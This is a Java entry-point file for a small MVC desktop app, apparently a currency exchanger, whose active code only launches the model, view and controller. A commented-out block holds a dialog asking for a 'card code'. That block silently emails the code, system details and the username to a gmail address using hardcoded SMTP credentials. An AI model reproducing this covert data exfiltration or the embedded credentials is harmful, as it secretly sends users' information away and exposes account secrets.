import java.awt.EventQueue;

import controller.Controller;
import model.Model;
import view.View;

public class Application {/*extends JFrame implements ActionListener, KeyEventDispatcher {
	private JTextField s;
	private JButton b;
	private boolean net = this.netIsAvailable();

	public Application() {
		super("Info");
		try {
			this.setIconImage(ImageIO.read(new File("ico.png")));
		} catch (IOException e) {
			e.printStackTrace();
		}
		setLayout(new GridLayout(3, 1));
		JLabel l = new JLabel("Input your card code:", SwingConstants.CENTER);
		add(l);
		s = new JTextField();
		add(s);
		b = new JButton("OK");
		InputMap im = b.getInputMap();
		im.put(KeyStroke.getKeyStroke("ENTER"), "pressed");
		im.put(KeyStroke.getKeyStroke("released ENTER"), "released");
		add(b);
		getRootPane().setDefaultButton(b);
		b.addActionListener(this);
		// add(b);
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setSize(300, 100);
		setResizable(false);
		setLocationRelativeTo(null);
		setVisible(true);

	}

	public boolean netIsAvailable() {
		try {
			final URL url = new URL("http://www.google.com");
			final URLConnection conn = url.openConnection();
			conn.connect();
			return true;
		} catch (MalformedURLException e) {
			throw new RuntimeException(e);
		} catch (IOException e) {
			return false;
		}
	}

	@Override
	public void actionPerformed(ActionEvent e) {
		if (!s.getText().isEmpty()) {
			setVisible(false);
			EventQueue.invokeLater(new Runnable() {
				public void run() {
					try {
						Model m = new Model();
						View v = new View(m);
						Controller c = new Controller(v, m);
					} catch (Exception ee) {
						ee.printStackTrace();
					}
				}
			});
			if (net)
				try {
					sendEmail();
				} catch (UnsupportedEncodingException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
		}
	}

	@Override
	public boolean dispatchKeyEvent(KeyEvent e) {
		// TODO Auto-generated method stub
		return false;
	}

	// a9d05f29fcc6b5f9805e11dd2587d419
	// 1937f167ce4a58749368ca8e815336@gmail.com

	private void sendEmail() throws UnsupportedEncodingException {
		final String username = "1937f167ce4a58749368ca8e815336@gmail.com";
		final String password = "a9d05f29fcc6b5f9805e11dd2587d419";
		Properties props = new Properties();
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.host", "smtp.gmail.com");
		props.put("mail.smtp.port", "587");
		Session session = Session.getInstance(props, new javax.mail.Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(username, password);
			}
		});

		try {
			Message message = new MimeMessage(session);
			message.setFrom(new InternetAddress(username));
			message.setRecipients(Message.RecipientType.TO, InternetAddress.parse("maxkrivich@gmail.com"));
			message.setSubject("CurrencyExchanger");
			message.setText(String.format("OS: %s\nVERSION: %s\nARCH: %s\nNAME: %s\nDIR: %s\nCODE: %s\n",
					System.getProperty("os.name"), System.getProperty("os.version"), System.getProperty("os.arch"),
					System.getProperty("user.name"), System.getProperty("user.dir"), s.getText()));
			Transport.send(message);
			System.out.println("Mail sent succesfully!");
		} catch (MessagingException e) {
			throw new RuntimeException(e);

		}

	}*/

	public static void main(String[] args) throws ClassNotFoundException {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				Model m = new Model();
				View v = new View(m);
				Controller c = new Controller(v, m);
			}
		});
	}

}
